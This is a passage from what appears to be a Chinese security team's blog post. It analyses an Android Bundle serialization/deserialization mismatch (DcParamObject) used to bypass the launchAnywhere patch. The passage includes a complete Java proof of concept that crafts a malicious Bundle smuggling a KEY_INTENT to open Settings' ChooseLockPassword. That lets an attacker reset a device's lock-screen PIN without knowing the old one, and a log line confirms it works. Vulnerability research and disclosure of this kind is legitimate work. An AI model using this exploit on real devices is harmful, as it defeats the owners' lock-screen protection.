<p><img src="/2018/07/03/bundle-mismatch/dc.png" alt="Bundle2"></p>
<p>在Autherticator App中构造恶意Bundle，携带三个键值对。第一个键值对携带一个DcParamObject对象；第二个键值对的键的16进制表示为0x06，长度为1，值的类型为13代表ByteArray，然后将恶意KEY_INTENT的内容放在ByteArray中；接下来，再随便放置一个键值对。</p>
<p>那么在<code>system_server</code>发生的第一次反序列化中，生成DcParamObject对象，mSubId通过readInt读入为1。后面两个键值对都不是KEY_INTENT，因此可以通过checkIntent检查。</p>
<p>然后，第二次序列化时<code>system_server</code>通过writeLong将mSubId写入Bundle，多出四个字节为0x0000 0000 0000 0001，后续内容不变。</p>
<p>最后，<code>Settings</code>反序列化读入Bundle，由于读入mSubID仍然为readInt，因此只读到0x0000 0001就认为读DcParamObject完毕。接下来开始读第二个键值对，把多出来的四个字节连同紧接着的1，认为是第二个键值对的键为null，然后6作为类型参数被读入，认为是long，于是后面把13和接下来ByteArray length的8字节作为第二个键值对的值。最终，恶意KEY_INTENT显现出来作为第三个键值对！</p>
<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">Bundle evilBundle = new Bundle();</div><div class="line">        Parcel bndlData = Parcel.obtain();</div><div class="line">        Parcel pcelData = Parcel.obtain();</div><div class="line"></div><div class="line">        // Manipulate the raw data of bundle Parcel</div><div class="line">        // Now we replace this right Parcel data to evil Parcel data</div><div class="line">        pcelData.writeInt(3); // number of elements in ArrayMap</div><div class="line">        /*****************************************/</div><div class="line">        // mismatched object</div><div class="line">        pcelData.writeString(&quot;mismatch&quot;);</div><div class="line">        pcelData.writeInt(4); // VAL_PACELABLE</div><div class="line">        pcelData.writeString(&quot;com.android.internal.telephony.DcParamObject&quot;); // name of Class Loader</div><div class="line">        pcelData.writeInt(1);//mSubId</div><div class="line"></div><div class="line">        pcelData.writeInt(1);</div><div class="line">        pcelData.writeInt(6);</div><div class="line">        pcelData.writeInt(13);</div><div class="line">        //pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent</div><div class="line">        pcelData.writeInt(-1); // dummy, will hold the length</div><div class="line">        int keyIntentStartPos = pcelData.dataPosition();</div><div class="line">        // Evil object hide in PeriodicAdvertisingReport.mData</div><div class="line">        pcelData.writeString(AccountManager.KEY_INTENT);</div><div class="line">        pcelData.writeInt(4);</div><div class="line">        pcelData.writeString(&quot;android.content.Intent&quot;);// name of Class Loader</div><div class="line">        pcelData.writeString(Intent.ACTION_RUN); // Intent Action</div><div class="line">        Uri.writeToParcel(pcelData, null); // Uri is null</div><div class="line">        pcelData.writeString(null); // mType is null</div><div class="line">        pcelData.writeInt(0x10000000); // Flags</div><div class="line">        pcelData.writeString(null); // mPackage is null</div><div class="line">        pcelData.writeString(&quot;com.android.settings&quot;);</div><div class="line">        pcelData.writeString(&quot;com.android.settings.password.ChooseLockPassword&quot;);</div><div class="line">        pcelData.writeInt(0); //mSourceBounds = null</div><div class="line">        pcelData.writeInt(0); // mCategories = null</div><div class="line">        pcelData.writeInt(0); // mSelector = null</div><div class="line">        pcelData.writeInt(0); // mClipData = null</div><div class="line">        pcelData.writeInt(-2); // mContentUserHint</div><div class="line">        pcelData.writeBundle(null);</div><div class="line"></div><div class="line">        int keyIntentEndPos = pcelData.dataPosition();</div><div class="line">        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;</div><div class="line">        pcelData.setDataPosition(keyIntentStartPos - 4);  // backpatch length of KEY_INTENT</div><div class="line">        pcelData.writeInt(lengthOfKeyIntent);</div><div class="line">        pcelData.setDataPosition(keyIntentEndPos);</div><div class="line">        Log.d(TAG, &quot;Length of KEY_INTENT is &quot; + Integer.toHexString(lengthOfKeyIntent));</div><div class="line"></div><div class="line">        ///////////////////////////////////////</div><div class="line">        pcelData.writeString(&quot;Padding-Key&quot;);</div><div class="line">        pcelData.writeInt(0); // VAL_STRING</div><div class="line">        pcelData.writeString(&quot;Padding-Value&quot;); //</div><div class="line"></div><div class="line"></div><div class="line">        int length  = pcelData.dataSize();</div><div class="line">        Log.d(TAG, &quot;length is &quot; + Integer.toHexString(length));</div><div class="line">        bndlData.writeInt(length);</div><div class="line">        bndlData.writeInt(0x4c444E42);</div><div class="line">        bndlData.appendFrom(pcelData, 0, length);</div><div class="line">        bndlData.setDataPosition(0);</div><div class="line">        evilBundle.readFromParcel(bndlData);</div><div class="line">        Log.d(TAG, evilBundle.toString());</div><div class="line">       return evilBundle;</div><div class="line"></div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>由于Settings似乎取消了自动化的点击新建账户接口，上述POC利用的漏洞触发还需要用户在Settings-&gt;Users&amp;accounts中点击我们加入的Authenticator，点击以后就会调用addAccount方法，最终能够启动settings中的隐藏Activity ChooseLockPassword。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">05-07 06:24:34.337  4646  5693 I ActivityManager: START u0 &#123;act=android.intent.action.RUN flg=0x10000000 cmp=com.android.settings/.password.ChooseLockPassword (has extras)&#125; from uid 1000</div></pre></td></tr></table></figure>
<p>原先设置锁屏PIN码的测试手机，就会出现重新设置PIN码界面，点一下返回，就会出现以下PIN码设置界面。这样就可以在不需要原PIN码的情况下重设锁屏密码。</p>
<p><img src="/2018/07/03/bundle-mismatch/unlock.png" alt="unlock"></p>
<h3 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h3><p>没想到序列化和反序列化作为极小的编程错误，却可以带来深远的安全影响。这类漏洞可能在接下来的安全公告中还会陆续有披露，毕竟在源码树中搜索序列化和反序列化不匹配的Parcelable类是较为容易的，漏洞的作者应该持续收割了一批。</p>
<p>然而，每个类不匹配的情况有所不同，因此在漏洞利用绕过launchAnywhere补丁时需要重新精确布置Bundle，读者可以用其他有漏洞的Parcelable类来练手。</p>
<p>这类漏洞也是不匹配或者说不一致（Inconsistency)性漏洞的典型。除了序列化和反序列化不一致外，历史上mmap和munmap不一致、同一功能实现在Java和C中的不一致、不同系统对同一标准实现的不一致等等都产生过有趣的漏洞，寻找这种不一致也是漏洞研究的一种方法论。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>[1] <a href="https://www.anquanke.com/post/id/103570" target="_blank" rel="external">漏洞预警 | Android系统序列化、反序列化不匹配漏洞</a></p>
<p>[2] <a href="http://retme.net/index.php/2014/08/20/launchAnyWhere.html" target="_blank" rel="external">launchAnyWhere: Activity组件权限绕过漏洞解析</a></p>
</div><div class="tags"><a href="/tags/android/">android</a></div><div class="post-nav"><a href="/2018/04/03/qwb2-silent-writeup/" class="next">强网杯silent分析</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Malware分析/">Malware分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制安全/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/二进制安全/">二进制安全</a></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/antiav/" style="font-size: 15px;">antiav</a> <a href="/tags/cknife/" style="font-size: 15px;">cknife</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/ios/" style="font-size: 15px;">ios</a> <a href="/tags/ms509/" style="font-size: 15px;">ms509</a> <a href="/tags/wannacry/" style="font-size: 15px;">wannacry</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/android-blueborne2/">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/blueborne/">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/Moto-bootloader-exploit/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/28/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/name-spoof/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>